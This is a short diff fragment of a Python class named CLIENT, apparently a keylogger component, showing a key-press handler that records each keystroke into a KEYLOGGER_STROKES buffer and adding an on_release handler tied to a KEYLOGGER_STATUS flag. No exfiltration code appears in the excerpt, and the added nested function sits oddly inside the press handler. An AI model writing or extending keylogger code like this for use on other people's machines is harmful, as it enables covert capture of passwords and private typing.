@@ -21,8 +21,13 @@ class CLIENT:
                 return False
         
         key = str(key)
-        
+
         if len(key.strip('\'')) == 1:
             self.KEYLOGGER_STROKES += key.strip('\'')
         else:
             self.KEYLOGGER_STROKES += ("[" + key + "]")
+
+        def on_release(key):
+            if not self.KEYLOGGER_STATUS:
+                return False
+        
